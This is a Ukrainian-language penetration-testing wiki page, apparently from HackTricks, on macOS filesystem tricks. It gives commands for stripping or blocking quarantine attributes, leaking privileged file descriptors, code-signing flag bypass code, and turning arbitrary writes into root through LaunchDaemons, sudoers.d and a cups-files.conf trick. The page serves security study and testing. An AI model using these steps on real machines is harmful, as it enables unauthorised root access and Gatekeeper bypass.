# Трюки з FS у macOS

{{#include ../../../../banners/hacktricks-training.md}}

## Комбінації дозволів POSIX

Для **каталогу** три біти дозволів означають не те саме, що для звичайного файла. `chmod(1)` називає біт виконання "**пошуком**", коли його застосовано до каталогу:<sup>[[2]](#references)</sup>

> `0100` Для файлів дозволяє власнику виконання. Для каталогів дозволяє власнику виконувати **пошук** у каталозі.

- **читання** - можна **перерахувати** записи каталогу (отримати список імен).
- **запис** - можна **створювати, перейменовувати та видаляти записи** в каталозі. Зверніть увагу: це властивість *батьківського* каталогу, а не файла: можна видалити файл, який ви не можете читати або змінювати, якщо маєте право запису до його батьківського каталогу.
- Щоб видалити **підкаталог**, він має бути порожнім, а це, своєю чергою, вимагає достатніх прав для видалення всього його вмісту.
- Якщо каталог має **sticky bit** (`S_ISVTX`, як `/tmp`), це обмежено — POSIX визначає, що процес може видаляти або перейменовувати файли в ньому лише якщо він є власником файла, власником каталогу або має відповідні привілеї.<sup>[[1]](#references)</sup>
- **виконання / пошук** - дозволено **проходити** через каталог. Розв'язання імені шляху знаходить кожен компонент "у каталозі, вказаному його попередником", тому **втрата прав пошуку на будь-якому окремому компоненті префікса шляху робить усе нижче нього недоступним за шляхом**, навіть якщо кінцевий файл доступний для читання всім.<sup>[[1]](#references)</sup>

### Небезпечні комбінації

**Як перезаписати файл/каталог, власником якого є root**, але:

- Власником одного **батьківського каталогу** в шляху є користувач
- Власником одного **батьківського каталогу** в шляху є **група користувачів** із **доступом на запис**
- **Група** користувачів має доступ на **запис** до **файла**

За будь-якої з наведених комбінацій attacker може **вставити** **sym/hard link** у очікуваний шлях, щоб отримати privileged arbitrary write.

### Особливий випадок: каталог root із R+X

Це безпосередньо випливає з наведеного вище правила розв'язання імені шляху. Якщо **каталог надає R+X лише root**, файли всередині нього недоступні *за шляхом* для всіх інших — але **власні біти дозволів файлів можуть залишатися відкритими**. Єдиною перешкодою є каталог.

Тож будь-який primitive, який дає змогу перемістити файл **за межі цього каталогу** — наприклад, privileged process, який **переміщує/перейменовує/копіює** вибраний attacker-ом шлях у місце, через яке ви можете пройти, — перетворюється на arbitrary read, без необхідності обходити власний mode файла:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Шукайте privileged file movers (installers, log rotators, crash/diagnostic collectors, backup та функції "export"), які приймають шлях до source від користувача з нижчими привілеями.

## Symbolic Link / Hard Link

### Permissive file/folder

Якщо privileged process записує дані у **file**, який може бути **контрольований** користувачем із **нижчими привілеями** або який міг бути **попередньо створений** користувачем із нижчими привілеями. Користувач може просто **вказати його на інший файл** через Symbolic або Hard link, і privileged process записуватиме саме в цей файл.

Перевірте інші розділи, де attacker може **зловживати довільним записом для підвищення привілеїв**.

### Open `O_NOFOLLOW`

Згідно з [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"If `O_NOFOLLOW` is used in the mask and the target file passed to `open()` is a symbolic link then the `open()` will fail."* Перевіряється лише **кінцевий** компонент — усі **проміжні** компоненти все ще розгортаються та проходять за посиланнями. Тому розробника, який "захистив" запис за допомогою `O_NOFOLLOW`, усе ще можна атакувати, розмістивши symlink у будь-якій **батьківській директорії** цільового шляху.<sup>[[3]](#references)</sup>

На тій самій сторінці man описані flags, які фактично усувають цю проблему:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"if ... any component of the path passed to `open()` is a symbolic link then the `open()` will fail."*
- **`O_RESOLVE_BENEATH`** — *"if ... the specified path resolution escapes the directory associated with the fd then the `openat()` will fail."*

В іншому разі залишаються `openat()` відносно directory FD, який ви вже перевірили, або `realpath()` + повторна перевірка — це способи запобігти symlink swaps у середині шляху.

## .fileloc

Files із розширенням **`.fileloc`** можуть вказувати на інші applications або binaries, тому під час їх відкриття буде виконано саме цю application/binary.\
Приклад:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Дескриптори файлів

### Leak FD (no `O_CLOEXEC`)

Якщо виклик `open` не містить прапорця `O_CLOEXEC`, дескриптор файлу буде успадкований дочірнім процесом. Тож якщо привілейований процес відкриває привілейований файл і запускає процес, контрольований attacker, attacker **успадкує FD до привілейованого файлу**.

Канонічним прикладом є **DYLD_PRINT_TO_FILE LPE в OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` враховував `DYLD_PRINT_TO_FILE=/path` навіть у **restricted (suid root) binaries**, оскільки саме ця змінна оброблялася поза межами `processDyldEnvironmentVariable()`.
- Він виконував `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, тому **створював файл, що належав root, за довільним шляхом**.
- FD **ніколи не закривався й не мав прапорця close-on-exec**, тому кожен дочірній процес suid binary успадковував **доступний для запису FD до файлу, що належав root**.
- Запуск, наприклад, `DYLD_PRINT_TO_FILE=/etc/target suid_binary`, а потім читання номера успадкованого FD у child, надавав можливість довільного запису до файлів, що належали root; `fcntl(fd, F_SETFL, 0)` навіть очищав `O_APPEND`, дозволяючи перезаписувати файл замість додавання в кінець.

Така сама ситуація виникає щоразу, коли привілейований процес відкриває файл **до** виконання через `exec` чогось, що контролюєте ви (helper tools, редактори у стилі `crontab`, запущені через `$EDITOR`, log/debug files, відкриті зі шляху env-var...). Перелічити успадковані FD можна за допомогою:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Усе, що перевищує `2` і вказує на файл, який ви не можете відкрити самостійно, є примітивом довільного запису (або довільного читання).

## Уникайте трюків із quarantine xattrs

### Видалити його
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Якщо файл/папка має цей атрибут незмінності, додати до нього xattr буде неможливо
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Файлові системи без підтримки xattr

Не кожна файлова система, яку macOS може монтувати, нативно зберігає **розширені атрибути**. HFS+ і APFS це підтримують; **FAT32, exFAT і (більшість) монтувань NFS — ні** — macOS емулює їх, записуючи бічний файл **AppleDouble** з назвою `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Це важливо для quarantine, оскільки xattr зберігається лише тоді, коли його справді можна записати **і знову прочитати** з того самого тому:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Якщо том пізніше читається за шляхом, який ігнорує супровідний файл `._` (або супровідний файл видаляється), файл надходить **без прапорця quarantine** — а невідкарантиненого `.app` достатньо, щоб обійти App Sandbox, як описано в [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Цей ACL не дає додавати `xattrs` до файлу.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Формат файлів **AppleDouble** копіює файл разом із його ACE.

У [**вихідному коді**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) можна побачити, що текстове представлення ACL, збережене всередині xattr під назвою **`com.apple.acl.text`**, буде встановлено як ACL у розпакованому файлі. Отже, якщо стиснути application у zip-файл у форматі **AppleDouble** з ACL, який забороняє запис інших xattr до нього... quarantine xattr не було встановлено в application:

Перегляньте [**оригінальний звіт**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) для отримання додаткової інформації.<sup>[[6]](#references)</sup>

Щоб відтворити це, спочатку потрібно отримати правильний ACL string:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Зверніть увагу, що навіть якщо це спрацює, sandbox спочатку запише xattr quarantine)

Насправді це не потрібно, але я залишаю це тут про всяк випадок:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Обхід перевірок підпису

### Обхід перевірок platform binaries

Деякі перевірки безпеки перевіряють, чи є binary **platform binary**, наприклад, щоб дозволити підключення до XPC service. Однак, як показано в описі обходу на https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, цю перевірку можна обійти, отримавши platform binary (наприклад, /bin/ls) та інжектуючи exploit через dyld за допомогою змінної середовища `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>

### Обхід flags `CS_REQUIRE_LV` і `CS_FORCED_LV`

Виконуваний binary може змінити власні flags, щоб обійти перевірки, за допомогою коду на кшталт:<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Обхід підписів коду

Bundles містять файл **`_CodeSignature/CodeResources`**, який містить **хеш** кожного окремого **файлу** в **bundle**. Зверніть увагу, що хеш CodeResources також **вбудовано у виконуваний файл**, тому ми не можемо змінити й його.

Однак є деякі файли, підпис яких не перевірятиметься; для них у plist є ключ `omit`, наприклад:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Підпис ресурсу можна обчислити з cli за допомогою:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Монтування dmgs

Користувач може змонтувати власноруч створений dmg навіть поверх деяких наявних папок. Ось як можна створити власний пакет dmg із власним вмістом:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Зазвичай macOS монтує диск, взаємодіючи з Mach-сервісом `com.apple.DiskArbitrarion.diskarbitrariond` (який надається `/usr/libexec/diskarbitrationd`). Якщо додати параметр `-d` до plist-файлу LaunchDaemons і перезапустити його, журнали зберігатимуться в `/var/log/diskarbitrationd.log`.\
Однак можна використовувати такі інструменти, як `hdik` і `hdiutil`, для прямої взаємодії з kext `com.apple.driver.DiskImages`.

## Довільний запис

### Періодичні sh-скрипти

Якщо ваш скрипт може інтерпретуватися як **shell script**, ви можете перезаписати shell script **`/etc/periodic/daily/999.local`**, який запускатиметься щодня.

Ви можете **імітувати** виконання цього скрипту за допомогою: **`sudo periodic daily`**

### Демони

Запишіть довільний **LaunchDaemon**, наприклад **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, із plist, який запускає довільний скрипт, наприклад:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Просто створіть скрипт `/Applications/Scripts/privesc.sh` із **командами**, які ви хотіли б виконати від імені root.

### Файл sudoers

Якщо у вас є **arbitrary write**, ви можете створити файл у папці **`/etc/sudoers.d/`**, надавши собі привілеї **sudo**.

### Файли PATH

Файл **`/etc/paths`** є одним із основних місць, звідки заповнюється змінна середовища PATH. Щоб перезаписати його, потрібні права root, але якщо скрипт із **privileged process** виконує певну **команду без повного шляху**, ви можете отримати змогу **hijack** її, змінивши цей файл.

Ви також можете записувати файли в **`/etc/paths.d`**, щоб завантажувати нові папки до змінної середовища `PATH`.

### cups-files.conf

Цю техніку використано в [цьому writeup](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>

Створіть файл `/etc/cups/cups-files.conf` із таким вмістом:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Це створить файл `/etc/sudoers.d/lpe` із правами доступу 777. Зайвий непотрібний текст у кінці потрібен для запуску створення журналу помилок.

Потім запишіть у `/etc/sudoers.d/lpe` необхідну конфігурацію для підвищення привілеїв, наприклад `%staff ALL=(ALL) NOPASSWD:ALL`.

Після цього знову змініть файл `/etc/cups/cups-files.conf`, вказавши `LogFilePerm 700`, щоб новий файл sudoers став коректним під час виклику `cupsctl`.

### Sandbox Escape

Можна вийти з macOS sandbox за допомогою FS arbitrary write. Приклади наведено на сторінці [macOS Auto Start](../../../../macos-auto-start-locations.md), але поширений варіант — записати файл налаштувань Terminal у `~/Library/Preferences/com.apple.Terminal.plist`, який виконує команду під час запуску, і викликати його за допомогою `open`.

## Створення доступних для запису файлів від імені інших користувачів

Дуже поширений прімитив privesc — змусити **привілейований процес створити для вас файл** у каталозі, яким ви керуєте, а потім зберегти **доступ на запис** до цього файлу. Потрібні дві складові:

1. Каталог, яким ви володієте (або в якому можна встановити **успадковуваний ACL**), щоб усе створене всередині успадковувало ваші дозволи.
2. Привілейований процес/процес із `suid`, якому можна вказати, **де** створити файл — зазвичай через змінну середовища налагодження/журналювання, конфігураційний файл або XPC API helper-процесу.

Саме частина з **успадковуваним ACL** робить створений файл доступним для запису вами, навіть якщо його власником є інший користувач. Прапорці успадкування `file_inherit` / `directory_inherit` описані в [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):<sup>[[2]](#references)</sup>
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Тепер будь-який файл, який privileged process створює всередині `$DIRNAME`, **доступний для запису вам**. Якщо цей каталог також є місцем, яке пізніше **виконується як root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, каталог LaunchDaemon...), це пряме підвищення привілеїв до root. Див. розділи [Sudoers File](#sudoers-file) і [cups-files.conf](#cups-filesconf) вище, щоб дізнатися, що записати після отримання файлу.

Повний робочий приклад ланцюжка «змінна середовища змушує root process створити файл, а FD витікає до вас» наведено вище в розділі [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec).

## Спільна пам’ять POSIX

**POSIX shared memory** дає змогу процесам у POSIX-сумісних операційних системах отримувати доступ до спільної області пам’яті, забезпечуючи швидший обмін даними порівняно з іншими методами міжпроцесної взаємодії. Це передбачає створення або відкриття об’єкта спільної пам’яті за допомогою `shm_open()`, встановлення його розміру через `ftruncate()` і відображення його в адресний простір процесу за допомогою `mmap()`. Після цього процеси можуть безпосередньо читати з цієї області пам’яті та записувати до неї. Для керування одночасним доступом і запобігання пошкодженню даних часто використовують механізми синхронізації, такі як mutex або semaphore. Зрештою процеси скасовують відображення та закривають спільну пам’ять за допомогою `munmap()` і `close()`, а за потреби видаляють об’єкт пам’яті через `shm_unlink()`. Ця система особливо ефективна для швидкого IPC у середовищах, де кільком процесам потрібно оперативно отримувати доступ до спільних даних.

<details>

<summary>Приклад коду Producer</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Приклад коду споживача</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## Захищені дескриптори macOS

**macOSCguarded descriptors** — це функція безпеки, представлена в macOS для підвищення безпеки та надійності операцій із **file descriptor** у користувацьких застосунках. Ці захищені дескриптори дають змогу пов’язувати з дескрипторами файлів певні обмеження або «захисти», дотримання яких забезпечує kernel.

Ця функція особливо корисна для запобігання певним класам вразливостей безпеки, як-от **несанкціонований доступ до файлів** або **race conditions**. Такі вразливості виникають, наприклад, коли thread отримує доступ до file description, надаючи **іншому вразливому thread доступ до нього**, або коли file descriptor **успадковується** вразливим child process. Деякі функції, пов’язані з цією функціональністю:

- `guarded_open_np`: Відкриває FD із guard
- `guarded_close_np`: Закриває його
- `change_fdguard_np`: Змінює прапорці guard для дескриптора (навіть видаляючи захист guard)

## References

- [1] [POSIX.1-2024 — Базові визначення, гл. 4 (дозволи доступу до файлів, захист каталогів, розв’язання шляхів)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` — сторінка man](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` — сторінка man](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins — локальне підвищення привілеїв OS X 10.10 через DYLD_PRINT_TO_FILE](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company — Які файлові системи та cloud-сервіси зберігають розширені атрибути?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft — Ахіллесова п’ята Gatekeeper: виявлення вразливості macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) — Нова ера обходів macOS Sandbox](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji — Виявлення вразливостей Apple: історія аудиту diskarbitrationd і storagekitd, частина 1](https://www.kandji.io/blog/macos-audit-story-part1)
{{#include ../../../../banners/hacktricks-training.md}}
